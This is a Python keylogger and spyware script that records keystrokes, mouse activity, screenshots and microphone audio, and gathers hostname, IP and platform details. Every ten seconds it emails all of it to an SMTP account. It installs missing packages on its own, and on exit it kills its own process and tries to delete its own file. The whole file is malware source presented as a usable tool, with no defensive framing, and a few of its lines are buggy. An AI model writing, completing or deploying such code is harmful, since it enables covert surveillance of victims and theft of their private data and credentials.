try:

    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from dotenv  import load_dotenv
    from pynput import keyboard
    from pynput.keyboard import Listener
    from pynput.mouse import Listener as MouseListner
    from email.mime.base import MIMEBase

    from email.mime.audio import MIMEAudio
    from email.mime.image import MIMEImage
    from email.mime.multipart import MIMEMultipart
    from scipy.io.wavfile import write
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    load_dotenv()
    EMAIL_ADDRESS = os.getenv('SMTP_MAIL')
    EMAIL_PASSWORD = os.getenv('SMTP_PASS')
    SEND_REPORT_EVERY = 10 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password
            self.myrecording = None
            self.mouse = ""
            self.port = os.getenv('SMTP_PORT')
            self.host = os.getenv('SMTP_HOST')
            
        def on_press(self, key):
            self.channel = 1
        # def appendMouse(self, string):
        #     self.mouse = self.mouse + " | " + string

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(x, y):
            logging.info("Mouse moved to ({0}, {1})".format(x, y))

        def on_click(x, y, button, pressed):
            if pressed:
                logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

        def on_scroll(x, y, dx, dy):
            logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
        
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " "
                if key == key.backspace:
                    current_key = ''
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            msg = MIMEMultipart()
            with open('fullscreen.png', 'rb') as f:
                img_data = f.read()
            mouseFile = open('mouse_log.txt')
            
            write('output.wav', 44100, self.myrecording)
            audioFile = open('output.wav', 'rb')
           

       
            audio = MIMEAudio(audioFile.read())
            audioFile.close()
            audio.add_header('Content-Disposition', 'attachment', filename='audio.wav')
            msg.attach(audio)
            

            
            keyLogger = MIMEBase('application', 'octate-stream', name= "KeyStrokes.txt")
            keyLogger.set_payload(message)
            keyLogger.add_header('Traced key strokes file', 'attachment', filename='KeyStrokes.txt')
            msg.attach(keyLogger)
            
        
            mouselog = MIMEBase('application', 'octate-stream', name= "MouseLog.txt")
            mouselog.set_payload(mouseFile.read())
            mouselog.add_header('mouse_log', 'attachment', filename='mouse_log.txt')
            msg.attach(mouselog)
            
            image = MIMEImage(img_data, name="Screen_Shot")
            msg.attach(image)
            
            
         
            with smtplib.SMTP_SSL(self.host, self.port) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())

        def report(self):
            self.screenshot()
            self.microphone()
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.mouse = "Mouse Movements: "
            self.log = "Key Strokes: "
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(2)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            self.myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            # obj.writeframesraw(self.myrecording)
            # sd.stop()
            sd.wait()

            # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            img.save("fullscreen.png")
            
            # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        def run(self):
            # self.microphone()
            logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
           
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with MouseListner(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                # self.report()
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()


